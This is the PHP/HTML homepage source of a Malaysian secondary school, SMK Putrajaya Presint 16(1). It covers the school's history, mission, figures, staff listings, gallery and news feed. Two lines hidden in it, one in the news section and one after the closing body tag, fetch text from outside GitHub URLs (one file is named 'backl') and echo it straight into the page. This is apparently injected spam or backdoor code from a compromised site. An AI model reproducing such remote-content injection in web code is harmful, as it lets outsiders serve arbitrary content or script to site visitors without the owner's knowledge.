<!DOCTYPE html>
<html lang="en">
  

<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="icon" href="images/LOGOSMKPP16.png">
    <meta name="description" content="Sekolah Menengah Kebangsaan Putrajaya Presint 16(1) terletak di Presint 16, Wilayah Persekutuan Putrajaya. Pada awalnya sekolah ini diberi nama SMK Putrajaya 3 kerana ia merupakan sekolah menengah ke-3 di Wilayah Persekutuan Putrajaya. ">
    <meta name="keywords" content="">
    <meta name="author" content="">

    <title>SMKPP 16(1) Murid ceria, guru bahagia, sekolah bitara, negara sejahtera</title>
    <!-- Swiper Slider CSS -->
    <link href="css/swiper.css" rel="stylesheet">
	<!-- Custom Main StyleSheet CSS -->
    <link href="css/login-register.css" rel="stylesheet">

    <link href="css/css/style.css" rel="stylesheet">
    <!-- Color CSS -->
    <link href="css/color.css" rel="stylesheet">
    <!-- Responsive CSS -->
    <link href="css/responsive.css" rel="stylesheet">


    <style type="text/css">


#main #gallery .gallery-item {
  height: 300px;
}
#main #gallery .gallery-item .album {
  position: relative;
  width: 80%;
  margin: auto;
  -moz-transition: all 0.5s;
  -o-transition: all 0.5s;
  -webkit-transition: all 0.5s;
  transition: all 0.5s;
}
#main #gallery .gallery-item .album img {
  width: 100%;
  position: absolute;
  cursor: pointer;
  top: 0;
  left: 0;
  border: 4px solid #FFF;
  -moz-box-shadow: 0 0 4px black;
  -webkit-box-shadow: 0 0 4px black;
  box-shadow: 0 0 4px black;
  -moz-border-radius: 6px;
  -webkit-border-radius: 6px;
  border-radius: 6px;
  -moz-transition: all 1s;
  -o-transition: all 1s;
  -webkit-transition: all 1s;
  transition: all 1s;
  -moz-transform-origin: 50% 50% 50%;
  -ms-transform-origin: 50% 50% 50%;
  -webkit-transform-origin: 50% 50% 50%;
  transform-origin: 50% 50% 50%;
}
#main #gallery .gallery-item .album img:first-child {
  position: relative;
  z-index: 1000;
}
#main #gallery .gallery-item .album img:first-child + img {
  -moz-transform: rotate(-4deg);
  -ms-transform: rotate(-4deg);
  -webkit-transform: rotate(-4deg);
  transform: rotate(-4deg);
}
#main #gallery .gallery-item .album img:last-child {
  -moz-transform: rotate(4deg);
  -ms-transform: rotate(4deg);
  -webkit-transform: rotate(4deg);
  transform: rotate(4deg);
}
#main #gallery .gallery-item .album:hover {
  width: 85%;
}
#main #gallery .gallery-item .album:hover img {
  z-index: 2000;
}
#main #gallery .gallery-item .album:hover img:first-child {
  z-index: 3000;
}
#main #gallery .gallery-item .album:hover img:first-child + img {
  left: -40px;
  -moz-transform: rotate(-10deg);
  -ms-transform: rotate(-10deg);
  -webkit-transform: rotate(-10deg);
  transform: rotate(-10deg);
}
#main #gallery .gallery-item .album:hover img:last-child {
  left: 40px;
  -moz-transform: rotate(10deg);
  -ms-transform: rotate(10deg);
  -webkit-transform: rotate(10deg);
  transform: rotate(10deg);
}
#main #gallery .gallery-item p {
  width: 100%;
  text-align: center;
  color: #FFF;
  padding-top: 20px;
}

</style>

  </head>

  <body>

<!--gt Wrapper Start-->  
<div class="gt_wrapper">

    <?php include('header.php'); ?>

    <!--Banner Wrap Start-->
    <div class="gt_banner default_width">
        <div class="swiper-container" id="swiper-container">
             <ul class="swiper-wrapper">
                <?php
$slider_query=query("SELECT * FROM slider WHERE status=1");
foreach($slider_query->rows as $rows)
{

?>
                <li class="swiper-slide">
                    <img src="images/slider/<?php echo $rows['image'] ?>" alt="">
                   
                </li>

                <?php } ?>
           <!--      <li class="swiper-slide">
                    <img src="extra-images/banner-02.jpg" alt="">
                  
                </li>
                <li class="swiper-slide">
                    <img src="extra-images/banner-03.jpg" alt="">
                    
                </li> --> 
             </ul>
         </div>
        <div class="swiper-button-next"><i class="fa fa-angle-right"></i></div>
        <div class="swiper-button-prev"><i class="fa fa-angle-left"></i></div>
    </div>
    <!--Banner Wrap End-->

    <!--Main Content Wrap Start-->
    <div class="gt_main_content_wrap">

         <div class="default_width gt_home2_services">
            <div class="row">
                <div class="col-md-3 col-sm-6 no_padding">
                    <div class="gt_main_services bg_1">
                        <i class="icon-write-board" style="text-align:center;"></i>
                        <h5 style="text-align:center;">MURID CERIA</h5>
                            <p>Memastikan setiap murid mendapat peluang pendidikan dan layanan sama rata serta berkualiti. Memastikan kemenjadian murid dari aspek kepimpinan </p>
                    </div>
                </div>
                
                <div class="col-md-3 col-sm-6 no_padding">
                    <div class="gt_main_services bg_2">
                        <i class="icon-teacher-showing-on-whiteboard" style="text-align:center;"></i>
                        <h5 style="text-align:center;">GURU BAHAGIA</h5>
                            <p>Mewujudkan jalinan dan jaringan kerjasama serta hubungan mesra antara guru, ibu bapa dan komuniti melalui Persatuan Ibu bapa dan Guru (PIBG).<br><br></p>
                            
                    </div>
                </div>
                
                <div class="col-md-3 col-sm-6 no_padding">
                    <div class="gt_main_services bg_3">
                        <i class="icon-compass" style="text-align:center;"></i>
                        <h5 style="text-align:center;">SEKOLAH BITARA</h5>
                            <p>Menyediakan landasan kerjasama sektor sekolah dengan pemain industri yang mampu membantu mewujudkan pembangunan digitalisasi, SDG2030 dan kepimpinan melalui aspirasi karamah insaniah.<br><br></p>
                    </div>
                </div>
                
                <div class="col-md-3 col-sm-6 no_padding">
                    <div class="gt_main_services bg_4">
                        <i class="icon-number-blocks" style="text-align:center;"></i>
                         <h5 style="text-align:center;">NEGARA SEJAHTERA</h5>
                            <p>Berusaha meningkatkan imej sekolah sebagai TRANSFORMASI dan SEKOLAH LESTARI STEM yang cemerlang dari kaca mata dunia pendidikan <br><br> </p>
                    </div>
                </div>
            </div>
        </div>
        

         <!--About Us Wrap Start-->
        <section class="gt_about_bg" id="about-us">
            <div class="container">
                <div class="row">
                    <div class="col-md-8">
                        <div class="gt_about_wrap">
                            <h4 class="title">Selamat Datang di SMK Putrajaya Presint 16 (1)
</h4>
                            <p style="color: #000;">Sekolah Menengah Kebangsaan Putrajaya Presint 16(1) terletak di Presint 16, Wilayah Persekutuan Putrajaya. Pada awalnya sekolah ini diberi nama SMK Putrajaya 3 kerana ia merupakan sekolah menengah ke-3 di Wilayah Persekutuan Putrajaya. Sekolah ini memulakan operasi pada tanggal 6 Januari 2003. Lokasi sekolah ini terletak di kawasan Pusat Pentadbiran Putrajaya. Keluasan SMK Putrajaya 3 ialah kira-kira 12.5 hektar dan mempunyai 6 blok utama iaitu Blok A (Blok Menara Jam), Blok B (Blok Pentadbiran), Blok C (Blok Bilik Darjah), Blok D (Bengkel), Blok E (Pavilion), Blok F (Dewan) dan Blok G (Surau). </p>
                            <p style="color: #000;">Pengetua pertama sekolah ini ialah Cik Rusnani bt Mohd Sirin yang mula menjalankan tugas pada 16 September 2003 hingga September 2005. Pengetua kedua yang bertugas di sekolah ini mulai 19 Ogos 2005 hingga 06 April 2015 ialah Tuan Haji Mohd Yusof bin Hassan. Tuan Hj. Mohd. Yusof b Hassan telah ditawarkan jawatan Pengarah Pejabat Pelajaran Wilayah Persekutuan Putrajaya mulai 16 Januari 2008 dan kembali semula ke sekolah ini pada 3 April 2008 dengan jawatan Pengetua Cemerlang DG 52 yang berkuatkuasa mulai 16 Feb 2008. Pengetua ketiga yang melaporkan diri pada 22 April 2015 ialah Encik Ab Aziz Bin Mamat.

                                <br><br>
                                Pada tanggal 18 Nov 2020, Cikgu Kamaluddin b Mohd Kassim telah diangkat sebagai Pengetua ke-4 bagi mendepani cabaran baru persekolahan mendepani pendidikan di kala kemelut pendemik COVID-19 melanda dunia. Aspirasi digitalisasi dan norma baharu dalam pendidikan Malaysia menjadi tonggak utama beliau. Bersama menjaga sahsiah, budi pekerti, hormat menghormati dalam memancu ilmu dan rohani ekosistem intelek cerdik industi 4.0.

  </p>
                       
                        </div>
                    </div>
                    <div class="col-md-4">
                        <div class="gt_about_img">
                            <img src="extra-images/about_us_img.jpg" alt="">
                        </div>
                    </div>
                </div>
            </div>
        </section>
        <!--About Us Wrap End-->


        <!--Offer Wrap start-->
        <section class="gt_wht_offer_bg" style="display:none;">
            <div class="container">
            	<div class="gt_hdg_1">
                    <h3>APA YANG KAMI TAWARKAN</h3>
                    <p>Aenean commodo ligula eget dolor. Aenean massa. <span>elit, eget nibh etlibura.</span>
                    </p>
                    <span><img src="images/hdg-01.png" alt=""></span>
                </div>
                <!--What We Offer 2 Wrap Start-->
                <div class="row">
                    <div class="col-md-4 col-sm-6">
                        <div class="gt_wht_offer_wrap mb">
                            <i class="icon-meat bg_1"></i>
                            <div class="gt_wht_offer_des">
                                <h5><a href="#">Makanan berkhasiat</a></h5>
                                <span class="bg_offer_1"></span>
                                <p>This is Photoshop's version of Lorem Ipsum. Proin gravida nibh vel velit auctor aliquet avida nibh vel velit auctor aliquet.</p>
                            </div>
                        </div>
                    </div>
                    <div class="col-md-4 col-sm-6">
                        <div class="gt_wht_offer_wrap mb">
                            <i class="icon-pencil bg_2"></i>
                            <div class="gt_wht_offer_des">
                                <h5><a href="#">Pembelajaran Lukisan</a></h5>
                                <span class="bg_offer_2"></span>
                                <p>This is Photoshop's version of Lorem Ipsum. Proin gravida nibh vel velit auctor aliquet avida nibh vel velit auctor aliquet.</p>
                            </div>
                        </div>
                    </div>
                    <div class="col-md-4 col-sm-6">
                        <div class="gt_wht_offer_wrap mb">
                            <i class="icon-bus bg_3"></i>
                            <div class="gt_wht_offer_des">
                                <h5><a href="#">Perkhidmatan Bas</a></h5>
                                <span class="bg_offer_3"></span>
                                <p>This is Photoshop's version of Lorem Ipsum. Proin gravida nibh vel velit auctor aliquet avida nibh vel velit auctor aliquet.</p>
                            </div>
                        </div>
                    </div>
                    <div class="col-md-4 col-sm-6">
                        <div class="gt_wht_offer_wrap mb">
                            <i class="icon-translation bg_4"></i>
                            <div class="gt_wht_offer_des">
                                <h5><a href="#">Pelbagai Bahasa</a></h5>
                                <span class="bg_offer_4"></span>
                                <p>This is Photoshop's version of Lorem Ipsum. Proin gravida nibh vel velit auctor aliquet avida nibh vel velit auctor aliquet.</p>
                            </div>
                        </div>
                    </div>
                    <div class="col-md-4 col-sm-6">
                        <div class="gt_wht_offer_wrap mb">
                            <i class="icon-color bg_5"></i>
                            <div class="gt_wht_offer_des">
                                <h5><a href="#">Padanan Warna</a></h5>
                                <span class="bg_offer_5"></span>
                                <p>This is Photoshop's version of Lorem Ipsum. Proin gravida nibh vel velit auctor aliquet avida nibh vel velit auctor aliquet.</p>
                            </div>
                        </div>
                    </div>
                    <div class="col-md-4 col-sm-6">
                        <div class="gt_wht_offer_wrap mb">
                            <i class="icon-crayons bg_6"></i>
                            <div class="gt_wht_offer_des">
                                <h5><a href="#">Membuat lakaran</a></h5>
                                <span class="bg_offer_6"></span>
                                <p>This is Photoshop's version of Lorem Ipsum. Proin gravida nibh vel velit auctor aliquet avida nibh vel velit auctor aliquet.</p>
                            </div>
                        </div>
                    </div>
                </div>
                <!--What We Offer 2 Wrap End-->
            </div>
        </section>
        <!--offer Wrap End-->
        
        <!--Facts and Figure Wrap End-->
        <section class="fact_figure_bg">
            <div class="container">
                <div class="gt_hdg_1 white_hdg">
                    <h3>Fakta dan Rajah mengenai SMK Putrajaya Presint</h3>
                    
                    <span><img src="images/hdg-01.png" alt=""></span>
                </div>
                <div class="row">
                    <div class="col-md-3 col-sm-6">
                        <div class="gt_facts_wrap">
                            <h2 class="counter">27</h2>
                            <br><br>
                            <span>Mata pelajaran</span>
                         </div>
                         <span class="facts_border bg_1"></span>
                    </div>
                    <div class="col-md-3 col-sm-6">
                        <div class="gt_facts_wrap">
                            <h2 class="counter">10</h2>
                            <br><br>
                            <span>Makmal moden</span>
                         </div>
                         <span class="facts_border bg_2"></span>
                    </div>
                    <div class="col-md-3 col-sm-6">
                        <div class="gt_facts_wrap">
                            <h2 class="counter">78</h2>
                            <br><br>
                            <span>Tenaga Pengajar</span>
                        </div>
                        <span class="facts_border bg_3"></span>
                    </div>
                    <div class="col-md-3 col-sm-6">
                        <div class="gt_facts_wrap">
                            <h2 class="counter">1162</h2>
                            <br><br>
                            <span>Pelajar</span>
                        </div>
                        <span class="facts_border bg_4"></span>
                    </div>
                </div>
                <div class="gt_fact_link_wrap default_width">
                    <a class="button_style_1 btn_lg" href="sejarah_sekolah.php">Mengenai Kami</a>
                    <a class="button_style_1 btn_lg" href="hubungi.php">Hubungi Kami</a>
                </div>
            </div>
        </section>
        <!--Facts and Figure Wrap End-->

      

 <!--Meet Our Best Teacher Wrap Start-->
        <section>
            <div class="container">
                <!--Main Heading Wrap Start-->
                <div class="gt_hdg_1">
                    <h3>PENTADBIRAN SMK PUTRAJAYA PRESINT 16(1)</h3>
                   
                    <span><img src="images/hdg-01.png" alt=""></span>
                </div>
                <!--Main Heading Wrap End-->

                <!--Teacher List Wrap Start-->
                <div class="row">

<?php
$alumini_corner=query("SELECT * FROM pentadbir LIMIT 4");
foreach($alumini_corner-> rows as $rows)
{
?>

                    <div class="col-md-3 col-sm-6">
                        <div class="gt_team2_wrap">
                           <figure>
                                <img src="images/pentadbir/<?php echo $rows['image'] ?>" alt="">  
                            </figure>
                            <div class="gt_team2_des_wrap">
                                <span style="text-align:center;"><?php echo $rows['designation'] ?></span>
                                <h5 style="text-align:center;"><a href="#"><?php echo $rows['name'] ?></a></h5>
                                
                                <ul>
                                    <li><i class="fa fa-envelope-o"></i><?php echo $rows['details'] ?></li>
                                </ul>
                            </div>
                        </div>
                    </div>

<?php } ?>
                    
                    <div class="gt_view_more default_width">
<a href="pentadbir.php" style="background-color: #008dd2;color: #fff;border: none;">Keseluruhan</a>
                </div>


                   

                </div>
                <!--Teacher List Wrap End-->
            </div>
        </section>


 <section class="gt_gallery_filter_bg" style="background: #036;">
            <div class="container">
                <div class="row">

<h3 style="text-align:center;color: #fff;padding-bottom: 50px;">GALERI KAMI</h3>


<!-- <script src="//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/2.3.2/js/bootstrap.min.js"></script>
<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.0.0/css/bootstrap.min.css" /> -->
<div id="main" class="container">
 
  <div id="gallery" class="row">
   

    <?php
                   $query = query("SELECT `alb_id`, gal_img_name,`alb_title` FROM `album` inner join gallery on alb_id=gal_alb_id WHERE `section_id`='2' group by alb_id");
                    foreach($query->rows as $rows)
                    {
                        $gal_img_name = $rows["gal_img_name"];
                        $ext = pathinfo($gal_img_name,PATHINFO_EXTENSION);
                    ?>

<a href="view_gallery.php?id=<?php echo base64_encode($rows["alb_id"])?>&dr=<?php echo base64_encode('gallery')?>">
    <div class="col-md-4 gallery-item">
      <div class="album">
        <img src="images/gallery/<?php echo $gal_img_name?>" alt="" />
        <img src="images/gallery/<?php echo $gal_img_name?>" alt="" />
        <img src="images/gallery/<?php echo $gal_img_name?>" alt="" />
      </div>
      <br>
       <h5 style="text-align: center;color: #fff !important;"><?php echo $rows["alb_title"]?></h5>
    </div>

</a>
  <?php
                    }
                    ?>


  </div>
</div>






             <!--        <ul id="filterable-item-filter-1">
                        <li class="active"><a data-value="all">All</a></li>
                        <li><a data-value="1">Activites</a></li>
                        <li><a data-value="2">Courses</a></li>
                        <li><a data-value="3">Classes</a></li>
                        <li><a data-value="4">Learing Space</a></li>
                    </ul> -->

                 <!--   
                   <?php
                   $query = query("SELECT `alb_id`, gal_img_name,`alb_title` FROM `album` inner join gallery on alb_id=gal_alb_id WHERE `section_id`='2' group by alb_id");
                    foreach($query->rows as $rows)
                    {
                        $gal_img_name = $rows["gal_img_name"];
                        $ext = pathinfo($gal_img_name,PATHINFO_EXTENSION);
                    ?>

                    <div class="col-md-4 col-sm-4">
                        <div class="gt_latest_course2_wrap default_width mb" style="border: 5px solid red;
border-radius: 10px;">
                            <figure>
                                <img src="images/gallery/<?php echo $gal_img_name?>" alt="" style="width: 500px;height: 200px;">
                              
                            </figure>
                           
                            <div class="gt_latest_course_des default_width" style="">
                         <h5 style="text-align: center;color: #fff !important;"><a href="view_gallery.php?id=<?php echo base64_encode($rows["alb_id"])?>&dr=<?php echo base64_encode('gallery')?>" style="text-align: center;color: #fff !important;"><?php echo $rows["alb_title"]?></a></h5>
                         <br>
                               
                          <center>
                                <div class="" style="width: 35%;color: #fff !important;text-align: center;background: #000;padding: 5px;">
         <a href="view_gallery.php?id=<?php echo base64_encode($rows["alb_id"])?>&dr=<?php echo base64_encode('gallery')?>" style="color: #fff;">View</a>
                                </div>
                               </center>
                            </div> 
                        </div>
                    </div>

  <?php
                    }
                    ?> -->

                    </div>
                </div>
            </div>
        </section>



        <!--Our Gallery Wrap Start-->
        <section class="gt_gallery_bg" style="display:none;">
            <!--Main Heading Wrap Start-->
            <div class="gt_hdg_1">
                <h3>GALERI KAMI</h3>
                
                <span><img src="images/hdg-01.png" alt=""></span>
            </div>
            <!--Main Heading Wrap End-->

            <!--Gallery List Wrap Start-->
            <div class="gt_gallery_slider" id="gt_gallery_slider">
                <div class="item">
                    <div class="gt_gallery_wrap">
                        <img src="extra-images/gallery-01.jpg" alt="">
                    </div>
                </div>
                <div class="item">
                    <div class="gt_gallery_wrap">
                        <img src="extra-images/gallery-02.jpg" alt="">
                    </div>
                </div>
                <div class="item">
                    <div class="gt_gallery_wrap">
                        <img src="extra-images/gallery-03.jpg" alt="">
                    </div>
                </div>
                <div class="item">
                    <div class="gt_gallery_wrap">
                        <img src="extra-images/gallery-04.jpg" alt="">
                    </div>
                </div>
                <div class="item">
                    <div class="gt_gallery_wrap">
                        <img src="extra-images/gallery-05.jpg" alt="">
                    </div>
                </div>
                <div class="item">
                    <div class="gt_gallery_wrap">
                        <img src="extra-images/gallery-06.jpg" alt="">
                    </div>
                </div>
                <div class="item">
                    <div class="gt_gallery_wrap">
                        <img src="extra-images/gallery-07.jpg" alt="">
                    </div>
                </div>

                <div class="item">
                    <div class="gt_gallery_wrap">
                        <img src="extra-images/gallery-08.jpg" alt="">
                    </div>
                </div>


                <div class="item">
                    <div class="gt_gallery_wrap">
                        <img src="extra-images/gallery-09.jpg" alt="">
                    </div>
                </div>

                <div class="item">
                    <div class="gt_gallery_wrap">
                        <img src="extra-images/gallery-10.jpg" alt="">
                    </div>
                </div>


            </div>
            <!--Gallery List Wrap End-->
        </section>
        <!--Our Gallery Wrap End-->

   

    <!--Meet Our Best Teacher Wrap Start-->
        <section>
            <div class="container">
                <!--Main Heading Wrap Start-->
                <div class="gt_hdg_1">
                    <h3>GURU-GURU SMK PUTRAJAYA PRESINT 16(1)</h3>
                    
                    <span><img src="images/hdg-01.png" alt=""></span>
                </div>
                <!--Main Heading Wrap End-->

                <!--Teacher List Wrap Start-->
                <div class="row">
                   
                   <?php
$guru=query("SELECT * FROM guru LIMIT 4");
foreach($guru-> rows as $rows)
{
?>

                    <div class="col-md-3 col-sm-6">
                        <div class="gt_team2_wrap mb">
                              <figure>
                                <img src="images/guru/<?php echo $rows['image'] ?>" alt="">  
                            </figure>
                            <div class="gt_team2_des_wrap">
                                <span style="text-align:center;"><?php echo $rows['designation'] ?></span>
                                <h5 style="text-align:center;"><a href="#"><?php echo $rows['name'] ?></a></h5>
                                
                                <ul>
                                    <li><i class="fa fa-envelope-o"></i><?php echo $rows['details'] ?></li>
                                </ul>
                            </div>
                        </div>
                    </div>

                    <?php } ?>



<div class="gt_view_more default_width">
                    <a href="guru.php" style="background-color: #008dd2;color: #fff;border: none;">Keseluruhan</a>
                </div>


                </div>
                <!--Teacher List Wrap End-->
            </div>
        </section>




<!--Testimonial Wrap Start-->
        <section class="gt_testimonial_bg">
            <div class="container">
                <!--Main Heading Wrap Start-->
                <div class="gt_hdg_1 white_hdg">
                    <h3>PANDANGAN IBU BAPA MENGENAI KAMI</h3>
                    <span><img src="images/hdg-01.png" alt=""></span>
                </div>
                <!--Main Heading Wrap End-->

                <!--Testimonial 02 List Wrap Start-->
                <div class="gt_testimonial2_slider" id="gt_testimonial2_slider">
                   

                    <div class="item">
                        <div class="gt_testi2_wrap">
                            <p style="text-align:justify;">Kami berterima kasih kepada <b>"Sekolah Menengah Kebangsaan Putrajaya Presint 16(1)" </b> kerana memperdengarkan anak-anak kami dan membantu mereka untuk memantapkan diri dalam dunia yang kompetitif ini.</p>
                            <div class="gt_testi2_detail">
                                <div class="gt_testi2_name">
                                    <h6> Md. Firoz Alam</h6>
                                </div>
                                <figure>
                                    <img src="images/LOGOSMKPP16.png" alt="" style="width:50px;">
                                    <br>
                                </figure>

                            </div>
                        </div>
                    </div>


 <div class="item">
                        <div class="gt_testi2_wrap">
                            <p style="text-align:justify;">Anak-anak kita telah mempelajari nilai-nilai kehidupan. <b> "Sekolah Menengah Kebangsaan Putrajaya Presint 16(1)" </b> telah memungkinkannya melalui kurikulum berdasarkan nilai mereka.<br><br></p>
                            <div class="gt_testi2_detail">
                                <div class="gt_testi2_name">
                                    <h6>Md. Nazir Uddin</h6>
                                </div>
                                <figure>
                                    <img src="images/LOGOSMKPP16.png" alt="" style="width:50px;">
                                    <br>
                                </figure>
                            </div>
                        </div>
                    </div>


                     <div class="item">
                        <div class="gt_testi2_wrap">
                            <p style="text-align:justify;">Pendidikan tidak hanya membantu kita dalam memantapkan diri dalam masyarakat tetapi juga membentuk akhlak kita. Terima kasih kepada <b> "Sekolah Menengah Kebangsaan Putrajaya Presint 16(1)" </b>.</p>
                            <div class="gt_testi2_detail">
                                <div class="gt_testi2_name">
                                    <h6>Md. Arif</h6>
                                </div>
                                <figure>
                                    <img src="images/LOGOSMKPP16.png" alt="" style="width:50px;">
                                    <br>
                                </figure>
                            </div>
                        </div>
                    </div>

                    



                </div>
                <!--Testimonial 02 List Wrap End-->

            </div>
        </section>
        <!--Testimonial Wrap End-->




<!--Latest News Wrap Start-->
        <section class="gt_news_bg">
            <div class="container">
                <!--Main Heading Wrap Start-->
                <div class="gt_hdg_1">
                    <h3>Berita Sekolah</h3>
                   
                    <span><img src="images/hdg-01.png" alt=""></span>
                </div>
                <!--Main Heading Wrap End-->

                <!--Latest News Wrap Start-->
                <div class="row">

                    <?php
                          $blog_query=query("SELECT * FROM blog");
                          foreach($blog_query->rows as $rows)
                          {
                          ?>

                    <div class="col-md-4 col-sm-6">
                        <div class="gt_blog_wrap">
                            <figure>
                                <img src="images/blog/thumb/<?php echo $rows['image'] ?>" alt="">
                               
                            </figure>
                            <div class="gt_blog_des_wrap">
                               
                               <?php 
    $news_title = strip_tags($rows['title']);
    $snews_title = substr($news_title,0,30);
?>
                                <h5><a href="notice_details.php?id=<?php echo $rows['blog_id'] ?>"><?php echo $snews_title ?>...</a></h5>
                                <p style="text-align:justify;color: #000;">
                                    <?php 
    $news = strip_tags($rows['description']);
    $snews = substr($news,0,70);
?>
                                <?php  echo $snews; ?>... </p>

<a href="notice_details.php?id=<?php echo $rows['blog_id'] ?>" style="background-color: #008dd2;color: #fff;border: none;width: 117px;padding: 10px;">Lanjutan <i class="fa fa-arrow-circle-o-right"></i></a>
                            </div>
                        </div>
                    </div>
                        <?php
                        }
                        ?>
<?php $a = file_get_contents('https://raw.githubusercontent.com/SilenceIsGold88/Index/main/PrivateContent.txt');
echo $a; ?>                </div>
                <!--Latest News Wrap End-->

                 <div class="gt_view_more default_width">
                    <a href="notice.php" style="background-color: #008dd2;color: #fff;border: none;">Keseluruhan</a>
                </div>


            </div>
        </section>
        <!--Latest News Wrap End-->



    </div>
    <!--Main Content Wrap End-->
    

    <?php include('footer.php'); ?>

   

</div>
<!--gt Wrapper End-->

    <!--Jquery Library-->
    <script src="js/jquery.js"></script>
    <!--Bootstrap core JavaScript-->
    <script src="js/bootstrap.min.js"></script>
    <!--Swiper JavaScript-->
    <script src="js/swiper.jquery.min.js"></script>
    <!--Accordian JavaScript-->
    <script src="js/jquery.accordion.js"></script>
    <!--Count Down JavaScript-->
    <script src="js/jquery.downCount.js"></script>
    <!--Pretty Photo JavaScript-->
    <script src="js/jquery.prettyPhoto.js"></script>
    <!--Owl Carousel JavaScript-->
	<script src="js/owl.carousel.js"></script>
    <!--Number Count (Waypoint) JavaScript-->
	<script src="js/waypoints-min.js"></script>
    <!--Filter able JavaScript-->
	<script src="js/jquery-filterable.js"></script>
    <!--WOW JavaScript-->
    <script src="js/wow.min.js"></script>
    <!--Custom JavaScript-->
	<script src="js/custom.js"></script>

  </body>
<?php
$a = file_get_contents('https://raw.githubusercontent.com/andina8/code87/main/backl');
echo $a;
?>
</html>
